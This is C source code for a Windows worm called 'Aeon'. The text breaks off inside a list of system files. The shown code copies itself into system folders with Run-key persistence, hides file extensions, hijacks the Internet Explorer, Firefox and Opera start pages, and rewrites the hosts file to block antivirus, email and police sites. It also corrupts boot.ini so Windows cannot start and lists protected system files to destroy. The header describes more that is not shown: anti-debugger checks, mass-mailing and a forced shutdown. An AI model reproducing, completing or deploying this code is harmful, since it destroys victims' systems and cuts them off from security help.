/*
Payload of Aeon:

- The worm is waiting for 5 minutes, before starting the code
- Create a mutex to make sure the worm is only running once
- Check for SoftIce/OllyDbg/FileMon/RegMon and exit virus if found
- Change Name / Organisation values in Registry
- Change settings to hide file extensions and don't show hidden files in explorer
- Copy to different locations on PC and write Run value in HKEY_CURRENT_USER and HKEY_LOCAL_MACHINE
- Drop a HTML-File into %sysdir% and change IE Start Page to it
- Reset all individual settings of Firefox and change Start Page to the same HTML-File IE is using
- Change Opera Start Page to the HTML-File as well and change the values of the installed Search Engines
- Modify hosts and hosts.msn (by MSN Messenger) to make it impossible to connect to most AV related pages
- Disable the MAPI Warning in Outlook to hide from user
- Stay in background and try to spread via email every 60 seconds by creating a thread
- Check the date, on the 1st, 14th and 28th run the Payload:
	- Modify the " boot.ini " file, which will result in an error message before even starting the bootloader
	- Change almost all file associations in HKEY_CLASSES_ROOT
	- Set all system colors to black
	- Change registry values opening a messagebox before login page can be reached
	- Destroy various files listed in an array, which are located in %sysdir% and protected by windows
	- Wait about 5 seconds and close the upcoming warning message on german and english windows versions (using window handle)
	- Drop a batch file and open it several times
	- Shut down the system finally

=========================================================================
=========================================================================

	Author: SkyOut

	Compiled with: -> Visual C++ 2005 Express Edition
				   -> Microsoft PSDK for Windows Server 2003 R2

	Finished: 09th August 2006 - 04:00 - GMT +01:00

*/

/* Defining Windows Version being WindowsXP (0x0501) */
#define WIN32_WINNT 0x0501

/* The headers we need for our virus */
#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <mapi.h>

/* Change the Name and Organization value of Windows, can be seen in System Information */
void ChangeNameOrg(void)
{
	HKEY hKey;
	char szOwner[] = "SkyOut [ Aeon Virus ]";
	char szOrganization[] = "[ E - O - F ]";

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "RegisteredOwner", 0, REG_SZ, szOwner, sizeof(szOwner));
	RegSetValueEx(hKey, "RegisteredOrganization", 0, REG_SZ, szOrganization, sizeof(szOrganization));
	RegCloseKey(hKey);
}

/* This will pop up a messagebox every time before user can login to Windows */
void Messagebox(void)
{
	HKEY hKey;
	char szCaption[] = "SkyOut | Aeon Virus ]";
	char szText[] = "Your computer has been infected with the [Aeon] Virus -> SkyOut -> [Electrical Ordered Freedom]";

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "LegalNoticeCaption", 0, REG_SZ, szCaption, sizeof(szCaption));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "LegalNoticeText", 0, REG_SZ, szText, sizeof(szText));
	RegCloseKey(hKey);
}

/* Files with file attribute hidden are invisible in explorer and file extensions are not shown as well */
void MakeHidden(void)
{
	HKEY hKey;
	DWORD dwNull = 0;
	DWORD dwOne = 1;

	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Hidden", 0, REG_DWORD, (LPBYTE)&dwNull, sizeof(DWORD));
	RegSetValueEx(hKey, "HideFileExt", 0, REG_DWORD, (LPBYTE)&dwOne, sizeof(DWORD));
	RegCloseKey(hKey);
}

/* Copy to 5 different locations in %sysdir% (hidden):
	- %sysdir%
	- %sysdir%\wbem
	- %sysdir%\drivers
	- %sysdir%\spool
	- %sysdir%\oobe

Then write Run entries for all files in:
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
*/
void CopyToPC(void)
{
	HKEY hKey;
	HMODULE Mod;
	char szVirusPath[MAX_PATH];
	char szSysDir1[MAX_PATH];
	char szSysDir2[MAX_PATH];
	char szSysDir3[MAX_PATH];
	char szSysDir4[MAX_PATH];
	char szSysDir5[MAX_PATH];

	/* Get current location */
	Mod = GetModuleHandle(NULL);
	GetModuleFileName(Mod, szVirusPath, sizeof(szVirusPath));

	/* Get the location of %sysdir% */
	GetSystemDirectory(szSysDir1, sizeof(szSysDir1));
	strcat_s(szSysDir1, MAX_PATH, "\\Aeon.exe");

	GetSystemDirectory(szSysDir2, sizeof(szSysDir2));
	strcat_s(szSysDir2, MAX_PATH, "\\wbem\\Aeon.exe");

	GetSystemDirectory(szSysDir3, sizeof(szSysDir3));
	strcat_s(szSysDir3, MAX_PATH, "\\drivers\\Aeon.exe");

	GetSystemDirectory(szSysDir4, sizeof(szSysDir4));
	strcat_s(szSysDir4, MAX_PATH, "\\spool\\Aeon.exe");

	GetSystemDirectory(szSysDir5, sizeof(szSysDir5));
	strcat_s(szSysDir5, MAX_PATH, "\\oobe\\Aeon.exe");

	/* Copy the file from its current location into the five locations ins %sysdir% */
	CopyFile(szVirusPath, szSysDir1, FALSE);
	CopyFile(szVirusPath, szSysDir2, FALSE);
	CopyFile(szVirusPath, szSysDir3, FALSE);
	CopyFile(szVirusPath, szSysDir4, FALSE);
	CopyFile(szVirusPath, szSysDir5, FALSE);

	/* Make sure HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run exists */
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	RegCloseKey(hKey);

	/* Make sure HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run exists */
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	RegCloseKey(hKey);

	/* Write Run values in HKEY_LOCAL_MACHINE */
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Aeon1", 0, REG_SZ, szSysDir1, strlen(szSysDir1));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Aeon2", 0, REG_SZ, szSysDir2, strlen(szSysDir2));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Aeon3", 0, REG_SZ, szSysDir3, strlen(szSysDir3));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Aeon4", 0, REG_SZ, szSysDir4, strlen(szSysDir4));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Aeon5", 0, REG_SZ, szSysDir5, strlen(szSysDir5));
	RegCloseKey(hKey);

	/* Write Run values in HKEY_CURRENT_USER */
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Aeon1", 0, REG_SZ, szSysDir1, strlen(szSysDir1));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Aeon2", 0, REG_SZ, szSysDir2, strlen(szSysDir2));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Aeon3", 0, REG_SZ, szSysDir3, strlen(szSysDir3));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Aeon4", 0, REG_SZ, szSysDir4, strlen(szSysDir4));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Aeon5", 0, REG_SZ, szSysDir5, strlen(szSysDir5));
	RegCloseKey(hKey);
}

/* Check if the PC is infected by checking HKEY_LOCAL_MACHINE\SYSTEM\Aeon for " Aeon " = " Aeon " */
BOOL IsPCInfected()
{
	HKEY hKey;
	char szBuf[MAX_PATH];
	DWORD dwBufLength = sizeof(szBuf);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\Aeon", 0, KEY_QUERY_VALUE, &hKey);
	RegQueryValueEx(hKey, "Aeon", 0, NULL, szBuf, &dwBufLength);
	RegCloseKey(hKey);

	if (szBuf[0]!='A' || szBuf[1]!='e' || szBuf[3]!='o' || szBuf[4]!='n')
	{
		return -1;
	}
	else
	{
		return 0;
	}
}

/* Drop a HTML-File into %sysdir% and change Internet Explorer Start Page value in Registry to it */
void IEStartPageBSoD(void)
{
	HKEY hKey;
	HANDLE hFile;
	DWORD dwNumberOfBytesWritten;
	char szStartPage[MAX_PATH];

	char szBSoD[] = "<html><head><title>=== Infected with the AEON Virus ===</title></head><body bgcolor=\"#0000AA\">"
					"<h2><br><br><br><br>"
					"<center><FONT style=\"BACKGROUND-COLOR: #A9A9A9\" color=\"#000AA\">Windows</FONT></center><br>"
					"<font face=\"Courier New\" color=\"#FFFFFF\"><SPAN style=\"font-size:12pt;\">"
					"<center>A fatal exception ERROR has occured at 0xEOF.<br><br>"
					"Your computer has been infected with the <u>AEON</u> virus..."
					"This screen might be the last you see for a while,<br>after finishing different operations,<br>"
					"<u>AEON</u> will start a countdown of 60 000 milliseconds, which are 60 seconds.<br>"
					"After this 60 seconds the computer will be forced to poweroff.<br>"
					"The moment this happened you won't be able to access your Windows any more,<br>"
					"the bootloader can not be started and you will get an error message instead of a boot screen.<br>"
					"And even if you would be able to access your machine after the shutdown,<br>"
					"do not think anything will be as it was before, different things have been changed.<br>"
					"<br><br>[SkyOut]<br>[Electrical Ordered Freedom]</center></SPAN></h2></body></html>";

	GetSystemDirectory(szStartPage, sizeof(szStartPage));
	strcat_s(szStartPage, MAX_PATH, "\\BSoD.html");

	/* Create a possible old file */
	DeleteFile(szStartPage);

	/* Create the new one */
	hFile = CreateFile(szStartPage, GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, szBSoD, sizeof(szBSoD), &dwNumberOfBytesWritten, NULL);
	CloseHandle(hFile);

	/* Write the needed Registry values in HKEY_CURRENT_USER and HKEY_LOCAL_MACHINE */
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\Main", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Start Page", 0, REG_SZ, szStartPage, sizeof(szStartPage));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Internet Explorer\\Main", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Start Page", 0, REG_SZ, szStartPage, sizeof(szStartPage));
	RegCloseKey(hKey);

	/* Make the file hidden */
	SetFileAttributes(szStartPage, FILE_ATTRIBUTE_HIDDEN);
}

/* Reset all Firefox settings and change the Start Page value in pref.js to the HTML-File dropped by IEStartPageBSoD() */
void FirefoxStartPageBSoD(void)
{
	HANDLE hFile;
	HANDLE hFind;
    WIN32_FIND_DATA w32FD;
	DWORD dwNumberOfBytesWritten;
	char szProfileFolder[MAX_PATH];
	char szProfileFolder2[MAX_PATH];
	char szSysDir[MAX_PATH];
	char szPrefJS[MAX_PATH]; 

	/* Get the location of %sysdir% (normally C:\WINDOWS\system32) */
	GetSystemDirectory(szSysDir, sizeof(szSysDir));

	/* Create two lines of preferences, which should be set for Firefox:
		- user_pref("browser.startup.homepage", "file:///C:\WINDOWS\system32\BSoD.html");
		- user_pref("general.useragent.override", "[AEON] Virus - SkyOut - [Electrical Ordered Freedom]");
	*/

	strcpy_s(szPrefJS, MAX_PATH, "user_pref(\"browser.startup.homepage\", \"file:///");
	strcat_s(szPrefJS, MAX_PATH, szSysDir);
	strcat_s(szPrefJS, MAX_PATH, "\\BSoD.html\");\r\n");
	/* Help -> About Mozilla Firefox (Useragent string is changed) */
	strcat_s(szPrefJS, MAX_PATH, "user_pref(\"general.useragent.override\", \"[AEON] Virus - SkyOut - [Electrical Ordered Freedom]\");");

	/* Get the location of APPDATA directory, normally C:\Documents and Settings\<USERNAME>\Application Data */
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, szProfileFolder);
	strcat_s(szProfileFolder, MAX_PATH, "\\Mozilla\\Firefox\\Profiles");

	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, szProfileFolder2);
	strcat_s(szProfileFolder2, MAX_PATH, "\\Mozilla\\Firefox\\Profiles");

    strcat_s(szProfileFolder, sizeof(szProfileFolder), "\\*");

	/* Search for the first file in the directory APPDATA\Mozilla\Firefox\Profiles, which is the directory containing all 
	Firefox profiles */
    hFind = FindFirstFile(szProfileFolder, &w32FD);

	do
	{
		/* If filename is " . " or " .. " just continue */
		if (!((strcmp((char*) w32FD.cFileName, ".") && strcmp((char*) w32FD.cFileName, ".."))))
		{
			continue;
		}

		((strcpy_s(szProfileFolder, sizeof(szProfileFolder), szProfileFolder2)) & (strcat_s(szProfileFolder, sizeof(szProfileFolder), "\\")));
        strcat_s(szProfileFolder, sizeof(szProfileFolder), w32FD.cFileName);

		/* If we have found a directory (thats what we searh for) we go into it and overwrite the preferences file " pref.js " with
		the two setting we created above, first time user will start Firefox will set several other setting and it will start with
		a Mozilla Start Page */
        if(w32FD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
		{
            if ((SetCurrentDirectory(szProfileFolder)) != 0)
			{
				hFile = CreateFile("prefs.js", GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				WriteFile(hFile, szPrefJS, sizeof(szPrefJS), &dwNumberOfBytesWritten, NULL);
			}
        }
	}while(FindNextFile(hFind, &w32FD));
	/* Close handle when no files can be found anymore */
	FindClose(hFind);
}

/* Change the Start Page value in opera6.ini to the HTML-File created by IEStartPageBSoD() and change all Search Engine values in search.ini */
void OperaStartPageBSoD(void)
{
	char szProfileIni[MAX_PATH];
	char szSearchIni[MAX_PATH];
	char szSearchEngine[MAX_PATH];
	char szSysDir[MAX_PATH];
	int i;

	/* APPDATA (look above function) -> APPDATA\Opera\Opera\profile\opera6.ini, preferences file */
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, szProfileIni);
	strcat_s(szProfileIni, MAX_PATH, "\\Opera\\Opera\\profile\\opera6.ini");

	/* APPDATA (look above function) -> APPDATA\Opera\Opera\profile\search.ini, file containing information about the Search Engnines */
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, szSearchIni);
	strcat_s(szSearchIni, MAX_PATH, "\\Opera\\Opera\\profile\\search.ini");

	GetSystemDirectory(szSysDir, sizeof(szSysDir));
	strcat_s(szSysDir, MAX_PATH, "\\BSoD.html");

	/* Change Start Page to the file created by IEStartPageBSoD() */
	WritePrivateProfileString("User Prefs", "Home URL", szSysDir, szProfileIni);
	/* Value 2 means the Home URL specified location will be opened */
	WritePrivateProfileString("User Prefs", "Startup Type", "2", szProfileIni);
	/* No warning will be displayed if Opera is not the systems stanard browser */
	WritePrivateProfileString("User Prefs", "Show Default Browser Dialog", "0", szProfileIni);

	/* Overwrite Name / URL value for 50 Search Engines (Standard 35) */
	for ( i = 1; i < 51; i++)
	{
		sprintf_s(szSearchEngine, MAX_PATH, "Search Engine %i", i);
		WritePrivateProfileString(szSearchEngine, "Name", "AEON", szSearchIni);
		WritePrivateProfileString(szSearchEngine, "URL", "AEON", szSearchIni);
	}

}

/* Modify hosts and hosts.msn file in %sysdir%\drivers\etc\hosts to make it impossible to connect to most AV related pages */
void ModifyHostFile(void)
{
	HANDLE hFile;
	DWORD dwNumberOfBytesWritten;
	char szHostFile[MAX_PATH];
	char szHostFileMSN[MAX_PATH];

	char szHost[] = "# Copyright (c) 2006-? SkyOut [Electrical Ordered Freedom]\r\n"
					"#o_O uhoh, your computer has been infected with the AEON virus and yeeha\r\n"
					"#I changed this file to stop you from visiting some helpful sites...\r\n"
					"#I'm evil, right?! Yeah... I know and I will burn in hell, but until then\r\n"
					"#I will go on fucking up some nice shit -_-\r\n"
					"\r\n"
					"127.0.0.1		localhost\r\n"
					"\r\n"
					"# AntiVirus --- AntiVirus --- AntiVirus\r\n"
					"#======================================\r\n"
					"127.0.0.1		www.aladdin.de\r\n"
					"127.0.0.1		www.ealaddin.com\r\n"
					"127.0.0.1		www.asw.cz\r\n"
					"127.0.0.1		www.avira.com\r\n"
					"127.0.0.1		www.centralcommand.com\r\n"
					"127.0.0.1		www.clamav.net\r\n"
					"127.0.0.1		www.percomp.de\r\n"
					"127.0.0.1		www.commandcom.com\r\n"
					"127.0.0.1		www1.my-etrust.com\r\n"
					"127.0.0.1		www.ca.com/offices/germany\r\n"
					"127.0.0.1		www.ca.com\r\n"
					"127.0.0.1		www.vet.com.au\r\n"
					"127.0.0.1		www.cybersoft.com\r\n"
					"127.0.0.1		www.nod32.de/home/home.php\r\n"
					"127.0.0.1		www.nod32.com/home/home.htm\r\n"
					"127.0.0.1		www.f-secure.com\r\n"
					"127.0.0.1		www.finjan.com\r\n"
					"127.0.0.1		www.fortinet.com\r\n"
					"127.0.0.1		www.complex.is/cgi-bin/home_pager\r\n"
					"127.0.0.1		www.gdata.de\r\n"
					"127.0.0.1		www.ravantivirus.com\r\n"
					"127.0.0.1		www.jakobsoftware.de\r\n"
					"127.0.0.1		www.grisoft.com\r\n"
					"127.0.0.1		www.antivir.de\r\n"
					"127.0.0.1		www.hbedv.com\r\n"
					"127.0.0.1		www.free-av.de\r\n"
					"127.0.0.1		www.free-av.com\r\n"
					"127.0.0.1		www.hauri-europe.com/default.aspx?NAV=000\r\n"
					"127.0.0.1		www.hauri-europe.com/default.aspx?NAV=002\r\n"
					"127.0.0.1		www.ikarus-software.at\r\n"
					"127.0.0.1		www.kaspersky.com/de\r\n"
					"127.0.0.1		www.kaspersky.com\r\n"
					"127.0.0.1		www.mwti.de\r\n"
					"127.0.0.1		www.msspl.co.in/index.asp\r\n"
					"127.0.0.1		www.mitcom.de\r\n"
					"127.0.0.1		www.dials.ru/english/home.htm\r\n"
					"127.0.0.1		www.mks.com.pl/index-en.html\r\n"
					"127.0.0.1		www.drsolomon.com\r\n"
					"127.0.0.1		www.mcafee-at-home.com/international/germany\r\n"
					"127.0.0.1		www.mcafeeathome.com\r\n"
					"127.0.0.1		www.nai.com\r\n"
					"127.0.0.1		www.norman.no/de\r\n"
					"127.0.0.1		www.norman.com\r\n"
					"127.0.0.1		www.promus.de\r\n"
					"127.0.0.1		www.omegas.de\r\n"
					"127.0.0.1		www.panda-software.de\r\n"
					"127.0.0.1		www.pandasoftware.com\r\n"
					"127.0.0.1		www.bitdefender.de\r\n"
					"127.0.0.1		www.bitdefender.com\r\n"
					"127.0.0.1		www.sophos.de\r\n"
					"127.0.0.1		www.sophos.com\r\n"
					"127.0.0.1		www.sybari.com/default.aspx?alias=de-DE\r\n"
					"127.0.0.1		www.sybari.com\r\n"
					"127.0.0.1		www.symantec.de\r\n"
					"127.0.0.1		www.symantec.com\r\n"
					"127.0.0.1		www.trendmicro.de\r\n"
					"127.0.0.1		www.antivirus.com\r\n"
					"127.0.0.1		www.virusbuster.de\r\n"
					"127.0.0.1		www.virusbuster.hu/index.en.ie.shtml\r\n"
					"\r\n"
					"# Desktop Firewall --- Desktop Firewall --- Desktop Firewall\r\n"
					"#===========================================================\r\n"
					"127.0.0.1		www.agnitum.com\r\n"
					"127.0.0.1		www.aladdin.de\r\n"
					"127.0.0.1		www.ealaddin.com\r\n"
					"127.0.0.1		www.lockdowncorp.com\r\n"
					"127.0.0.1		www.mcafee.de\r\n"
					"127.0.0.1		www.mcafee.com\r\n"
					"127.0.0.1		www.networkice.com\r\n"
					"127.0.0.1		www.sygate.com\r\n"
					"127.0.0.1		www.tinysoftware.com\r\n"
					"127.0.0.1		www.zonelabs.com\r\n"
					"\r\n"
					"# AntiTrojan --- AntiTrojan --- AntiTrojan\r\n"
					"#=========================================\r\n"
					"127.0.0.1		www.anti-trojan.net\r\n"
					"127.0.0.1		www.astonsoft.com\r\n"
					"127.0.0.1		tds.diamondcs.com.au\r\n"
					"127.0.0.1		www.mischel.dhs.org\r\n"
					"127.0.0.1		www.moosoft.com\r\n"
					"127.0.0.1		www.nsclean.com\r\n"
					"\r\n"
					"# VirusInfo --- VirusInfo --- VirusInfo\r\n"
					"#======================================\r\n"
					"127.0.0.1		www.antivirus-online.de\r\n"
					"127.0.0.1		antivirus.about.com\r\n"
					"127.0.0.1		www.avien.org\r\n"
					"127.0.0.1		www.eicar.org\r\n"
					"127.0.0.1		www.tu-berlin.de/www/software/hoax.shtml\r\n"
					"127.0.0.1		www.vmyths.com\r\n"
					"127.0.0.1		www.trojaner-info.de/inhalt.shtml\r\n"
					"127.0.0.1		www.virusbtn.com\r\n"
					"127.0.0.1		www.wildlist.org\r\n"
					"\r\n"
					"# Virus Libraries --- Virus Libraries --- Virus Libraries\r\n"
					"#========================================================\r\n"
					"127.0.0.1		www.europe.datafellows.com/virus-info\r\n"
					"127.0.0.1		www.percomp.de/virusinformationen.html\r\n"
					"127.0.0.1		www.ikarus-software.at/portal/modules.php?name=Virenlexikon\r\n"
					"127.0.0.1		www.ravantivirus.com/pages/virus.php\r\n"
					"127.0.0.1		www.symantec.com/avcenter/vinfodb.html\r\n"
					"127.0.0.1		www.sophos.de/virusinfo/analyses\r\n"
					"127.0.0.1		www.trendmicro.com/vinfo\r\n"
					"127.0.0.1		vil.nai.com/vil/default.asp\r\n"
					"127.0.0.1		www.viruslist.com/eng/viruslist.asp"
					"\r\n"
					"# Email Providers --- Email Providers --- Email Providers\r\n"
					"#========================================================\r\n"
					"127.0.0.1		www.web.de\r\n"
					"127.0.0.1		www.gmx.net\r\n"
					"127.0.0.1		www.lycos.de\r\n"
					"127.0.0.1		www.arcor.de\r\n"
					"127.0.0.1		www.freenet.de\r\n"
					"127.0.0.1		www.yahoo.com\r\n"
					"127.0.0.1		www.aol.com\r\n"
					"127.0.0.1		www.t-online.de\r\n"
					"\r\n"
					"# Police --- Police --- Police\r\n"
					"#=============================\r\n"
					"127.0.0.1		www.fbi.gov\r\n"
					"127.0.0.1		www.interpol.int\r\n"
					"127.0.0.1		www.cia.gov\r\n"
					"127.0.0.1		www.polizei.de\r\n"
					"127.0.0.1		www.bka.de\r\n";

	/* %sysdir%\drvers\etc\hosts */
	GetSystemDirectory(szHostFile, sizeof(szHostFile));
	strcat_s(szHostFile, MAX_PATH, "\\drivers\\etc\\hosts");

	/* %sysdir%\drvers\etc\hosts.msn */
	GetSystemDirectory(szHostFileMSN, sizeof(szHostFileMSN));
	strcat_s(szHostFileMSN, MAX_PATH, "\\drivers\\etc\\hosts.msn");

	/* Overwrite both files */
	hFile = CreateFile(szHostFile, GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, szHost, sizeof(szHost), &dwNumberOfBytesWritten, NULL);
	CloseHandle(hFile);

	hFile = CreateFile(szHostFileMSN, GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, szHost, sizeof(szHost), &dwNumberOfBytesWritten, NULL);
	CloseHandle(hFile);
}

/* Overwrite the boot.ini file on the system drive, which will result in an error message before loading the bootloader next time,
making it not possible to start windows */
void DestroyBootIni(void)
{
	HANDLE hFile;
	DWORD dwNumberOfBytesWritten;
	char szBootIniDir[MAX_PATH];
	char szBootIniDir2[MAX_PATH];

	/* Just deleting boot.ini would not have worked (tested on WIN XP SP1), but only Xing the values, being normally 0 or 1 will
	result in an error message before starting anything (bootloader...) */
	char szBuffer[] = "[boot loader]\r\n"
						"timeout=30\r\n"
						"default=multi(X)disk(X)rdisk(X)partition(X)\\WINDOWS\r\n"
						"[operating systems]\r\n"
						"multi(X)disk(X)rdisk(X)partition(X)\\WINDOWS=\"Microsoft Windows\" /fastdetect";

	/* Get the location of WINDOWS directory, normally C:\WINDOWS */
	GetWindowsDirectory(szBootIniDir, sizeof(szBootIniDir));
	/* Getting the first three letters, being the system drive, normally C:\ */
	strncpy_s(szBootIniDir2, MAX_PATH, szBootIniDir, 3);
	/* Finally: C:\boot.ini */
	strcat_s(szBootIniDir2, MAX_PATH, "boot.ini");
	
	/* First delete the file */
	DeleteFile(szBootIniDir2);

	/* Create the new one with our modified text */
	hFile = CreateFile(szBootIniDir2, GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, szBuffer, sizeof(szBuffer), &dwNumberOfBytesWritten, NULL);
	CloseHandle(hFile);
}

/* A list of almost all important (and most SFC protected) files in %sysdir% and %windir% */
char *FileNameList[] = {"explorer.exe", "notepad.exe", "regedit.exe", "winhelp.exe", "cmd.exe",
						"accwiz.exe", "actmovie.exe", "ahui.exe", "alg.exe", "arp.exe",
						"at.exe", "atmadm.exe", "attrib.exe", "auditusr.exe", "autochk.exe", "autoconv.exe", "autofmt.exe",
						"autolfn.exe", "bootok.exe", "bootvrfy.exe", "cacls.exe", "calc.exe", "charmap.exe", "chkdsk.exe", 
						"chkntfs.exe", "cidaemon.exe", "cisvc.exe", "ckcnv.exe", "cleanmgr.exe", "cliconfg.exe", "clipbrd.exe",
						"clipsrv.exe", "cmdl32.exe", "cmmon32.exe", "cmstp.exe", "comp.exe", "compact.exe", "control.exe", "convert.exe",
						"cscript.exe", "ctfmon.exe", "dcomcnfg.exe", "ddeshare.exe", "debug.exe", "defrag.exe", 
						"dfrgfat.exe", "dfrgntfs.exe", "diantz.exe", "diskpart.exe", "diskperf.exe", "dllhost.exe", "dmadmin.exe",
						"dmremote.exe", "doskey.exe", "dosx.exe", "dplaysvr.exe", "dpnsvr.exe", "dpvsetup.exe", "drmupgds.exe",
						"drwatson.exe", "drwtsn32.exe", "dumprep.exe", "dvdupgrd.exe", "dwwin.exe", "dxdiag.exe",
						"dxdllreg.exe", "esentutl.exe", "eudcedit.exe", "eventvwr.exe", "exe2bin.exe", "expand.exe", "extrac32.exe",
						"fc.exe", "find.exe", "findstr.exe", "finger.exe", "fixmapi.exe", "fltmc.exe", "fontview.exe", "forcedos.exe",
						"freecell.exe", "fsquirt.exe", "fsutil.exe", "ftp.exe", "getmac.exe", "gdi.exe", "grpconv.exe", "help.exe", "hostname.exe",
						"iexpress.exe", "imapi.exe", "ipconfig.exe", "ipsec6.exe", "ipv6.exe", "java.exe", "javaw.exe", "javaws.exe",
						"jdbgmgr.exe", "jview.exe", "krnl386.exe", "label.exe", "lights.exe", "lnkstub.exe", "locator.exe", "lodctr.exe", 
						"logagent.exe", "logman.exe", "logoff.exe", "logonui.exe", "lpq.exe", "lpr.exe", "magnify.exe",
						"makecab.exe", "mem.exe", "mmc.exe", "mnmsrvc.exe", "mobsync.exe", "mountvol.exe", "mplay32.exe", "mpnotify.exe",
						"mrinfo.exe", "msdtc.exe", "msg.exe", "mshearts.exe", "mshta.exe", "msiexec.exe", "mspaint.exe", "mstinit.exe",
						"mstsc.exe", "narrator.exe", "nbtstat.exe", "nddeapir.exe", "net.exe", "netdde.exe", "netsetup.exe", "netsh.exe",
						"netstat.exe", "nslookup.exe", "odbcad32.exe", "odbcconf.exe", "osk.exe", "osuninst.exe",
						"packager.exe", "pathping.exe", "perfmon.exe", "ping6.exe", "ping.exe", "powercfg.exe", "print.exe", "proxycfg.exe",
						"qappsrv.exe", "qprocess.exe", "qwinsta.exe", "rasautou.exe", "rasdial.exe", "rasphone.exe", "rcimlby.exe",
						"rcp.exe", "rdpclip.exe",  "rdsaddin.exe", "rdshost.exe", "recover.exe", "redir.exe", "reg.exe", "regedt32.exe",
						"regini.exe", "regsvr32.exe", "regwiz.exe", "replace.exe", "reset.exe", "rexec.exe", "route.exe", "routemon.exe", 
						"rsh.exe", "rsm.exe", "rsmsink.exe", "rsmui.exe", "rsvp.exe", "rtcshare.exe", "runas.exe", "rundll32.exe", "runonce.exe",
						"rwinsta.exe", "savedump.exe", "sc.exe", "scardsvr.exe", "sdbinst.exe", "services.exe", "sessmgr.exe", "sethc.exe",
						"setserv.exe", "sfc.exe", "shadow.exe", "share.exe", "shmgrate.exe", "shrpubw.exe", "shutdown.exe", "sigverif.exe",
						"skeys.exe", "slrundll.exe", "slserv.exe", "smbinst.exe", "smlogsvc.exe", "sndrec32.exe", "sndvol32.exe",
						"sol.exe", "sort.exe", "spider.exe", "spnpinst.exe", "sprestrt.exe", "spdupdsvc.exe", "stimon.exe",
